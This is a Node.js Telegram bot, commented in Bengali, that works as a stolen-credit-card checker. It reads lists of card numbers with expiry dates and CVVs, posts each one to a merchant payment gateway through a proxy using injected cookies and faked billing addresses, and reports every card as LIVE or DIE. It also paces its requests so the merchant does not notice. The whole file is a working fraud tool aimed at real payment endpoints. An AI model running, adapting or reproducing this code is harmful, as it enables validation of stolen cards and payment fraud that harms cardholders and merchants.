const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');

const token = process.env.TELEGRAM_TOKEN;
const bot = new TelegramBot(token, { polling: true });

let targetWebsite = "https://portal.meydanfz.ae"; 
let activeCookies = "";
const proxyUrl = "http://YOUR_BRIGHT_DATA_PROXY"; 
const agent = new HttpsProxyAgent(proxyUrl);

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ১. ডাইনামিক অ্যাড্রেস জেনারেটর (Anti-Die এর জন্য)
function getAddress(cardNumber) {
    const firstDigit = cardNumber.charAt(0);
    // যদি কার্ডটি ৩ বা ৫ (Amex/Master) দিয়ে শুরু হয় এবং আমরা US ধরছি
    if (firstDigit === '3' || firstDigit === '5') {
        return {
            line1: "725 5th Ave",
            city: "New York",
            state: "NY",
            postal_code: "10022",
            country: "US"
        };
    } else {
        // আবুধাবির অ্যাড্রেস (আপনার স্ক্রিনশট অনুযায়ী)
        return {
            line1: "Hamdan Bin Mohammed Street",
            city: "Abu Dhabi",
            state: "Abu Dhabi",
            postal_code: "00000",
            country: "AE"
        };
    }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return;

    if (text.startsWith('http')) {
        targetWebsite = text;
        return bot.sendMessage(chatId, "🌐 গেটওয়ে সেট করা হয়েছে।");
    } 

    if (text.startsWith('[')) {
        try {
            const cookies = JSON.parse(text);
            activeCookies = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            return bot.sendMessage(chatId, "✅ Anti-Die কুকিজ সেট হয়েছে।");
        } catch (e) { return bot.sendMessage(chatId, "❌ ভুল JSON!"); }
    }

    if (text.includes('|')) {
        const cards = text.split('\n');
        bot.sendMessage(chatId, `🛡️ ${cards.length}টি কার্ড ডাইনামিক অ্যাড্রেস মোডে চেক হচ্ছে...`);

        for (let card of cards) {
            const [cc, mm, yy, cvv] = card.split('|').map(c => c.trim());
            const billing = getAddress(cc); // অটো অ্যাড্রেস সিলেকশন

            try {
                const response = await axios.post(targetWebsite, {
                    card_number: cc, exp_month: mm, exp_year: yy, cvv: cvv,
                    address: billing.line1, city: billing.city, 
                    state: billing.state, zip: billing.postal_code, country: billing.country
                }, {
                    headers: { 'Cookie': activeCookies, 'User-Agent': 'Mozilla/5.0' },
                    httpsAgent: agent
                });

                bot.sendMessage(chatId, `🟢 <b>LIVE</b> | <code>${card}</code>\n<b>Address:</b> ${billing.country}\n<b>MSG:</b> Approved`, { parse_mode: 'HTML' });

            } catch (error) {
                const errorMsg = error.response?.data?.message || error.message;
                bot.sendMessage(chatId, `🔴 <b>DIE</b> | <code>${card}</code>\n<b>MSG:</b> ${errorMsg}`, { parse_mode: 'HTML' });
            }
            await delay(10000); // ১০ সেকেন্ড বিরতি (মার্চেন্ট সেফ রাখতে)
        }
    }
});
